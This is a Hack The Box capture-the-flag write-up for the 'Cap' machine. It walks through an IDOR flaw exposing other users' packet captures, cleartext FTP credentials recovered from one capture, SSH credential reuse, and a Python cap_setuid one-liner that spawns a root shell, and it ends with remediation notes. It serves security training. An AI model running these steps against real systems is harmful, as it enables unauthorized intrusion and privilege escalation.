# HTB — Cap

**Platform:** Hack The Box
**Machine:** Cap
**OS:** Linux
**Difficulty:** Easy
**Target IP:** 10.129.134.144

---

## Summary

Foothold on this box comes from a web application that exposes network
capture files belonging to other users. One of those captures contains an
unencrypted login session, leaking valid credentials. Those credentials are
reused over SSH to land a shell and the user flag. Privilege escalation is
achieved through a Linux **capability** (`cap_setuid`) set on the system
Python binary, which allows setting the UID to 0 and spawning a root shell.

**Attack chain:** Web app capture download → cleartext credential leak →
SSH foothold → `cap_setuid` on `python3.8` → root.

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sV 10.129.134.144
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Observations:**

- **21/tcp — FTP (vsftpd 3.0.3):** An unencrypted protocol. Worth noting
  for later — anything that authenticates over FTP sends credentials in
  cleartext. vsftpd 3.0.3 is patched, so the classic backdoor does not apply.
- **22/tcp — SSH (OpenSSH 8.2p1):** Standard access route if credentials
  can be obtained.
- **80/tcp — HTTP (Gunicorn):** Gunicorn is a Python WSGI server, so the
  web app is a Python framework (Flask/Django-style) rather than a static
  site.

---

## 2. Enumeration — Web Application

Browsing the web application on port 80 reveals a dashboard that lets a user
download packet captures (`.pcap`). The download feature also exposes
captures belonging to **other users** — an Insecure Direct Object Reference
(IDOR)-style access control flaw, where requesting another identifier returns
a capture that should not be accessible.

```bash
http://10.129.134.144/data/1 --> http://10.129.134.144/data/0
```

### Analysing the capture in Wireshark

Opening the downloaded `.pcap` in Wireshark and following the TCP stream of
the session reveals a login performed over an unencrypted protocol
(consistent with the FTP service seen on port 21). Because the traffic is not
encrypted, the username and password appear in cleartext within the stream.

**Credentials recovered:**

```
nathan:Buck3tH4TF0RM3!
```

**Takeaway:** cleartext credentials in a captured stream almost always map
to one of the plaintext services on the box (FTP/HTTP/Telnet) and are very
commonly reused for SSH.

---

## 3. Foothold — SSH

The recovered credentials were tested against SSH and worked:

```bash
ssh nathan@10.129.134.144
# password: Buck3tH4TF0RM3!
```

Login succeeded, and the user flag was read from the home directory:

```bash
cat ~/user.txt
```

```
user.txt: [REDACTED — paste flag value here]
```

---

## 4. Privilege Escalation — Linux Capabilities

### Initial checks (no path found)

Standard escalation checks came back clean:

```bash
sudo -l      # no sudo rights
id           # no interesting group membership
groups
```

A search for SUID binaries returned only standard Ubuntu/snap binaries —
nothing custom or GTFOBins-exploitable:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
... (snap-bundled duplicates omitted)
```

### Checking file capabilities

SUID is only one mechanism for elevated execution; **Linux capabilities**
are a separate one that a SUID search will not reveal (and the hostname `cap`
is a strong hint toward this path). Enumerating capabilities:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The key finding is:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` allows the process to set its user ID to any value — including
0 (root) — without the binary being SUID-root. The `+eip` flags mean the
capability is Effective, Inheritable, and Permitted, so it is active when the
binary runs.

### Exploitation

Using Python to drop the UID to 0 and spawn a shell:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

This returns a root shell, and the root flag was read:

```bash
cat /root/root.txt
```

```
root.txt: [REDACTED — paste flag value here]
```

---

## 5. Loot

| Type        | Value                        |
|-------------|------------------------------|
| Credentials | `nathan:Buck3tH4TF0RM3!`     |
| User flag   | `[REDACTED]`                 |
| Root flag   | `[REDACTED]`                 |

---

## 6. Remediation Notes

- **Broken access control (web app):** Enforce authorization on the capture
  download feature so a user can only retrieve their own captures. Use
  non-guessable identifiers and server-side ownership checks to prevent
  IDOR-style access.
- **Cleartext protocols:** Avoid authenticating over unencrypted services
  such as plain FTP. Use FTPS/SFTP so credentials cannot be recovered from
  captured traffic.
- **Credential reuse:** The same password worked for the captured session
  and for SSH. Enforce unique credentials per service and consider key-based
  SSH authentication.
- **Overly broad capabilities:** Granting `cap_setuid` to a general-purpose
  interpreter like Python is effectively equivalent to giving it root. Remove
  unnecessary capabilities (`setcap -r /usr/bin/python3.8`) and scope any
  required capability to a purpose-built, minimal binary.
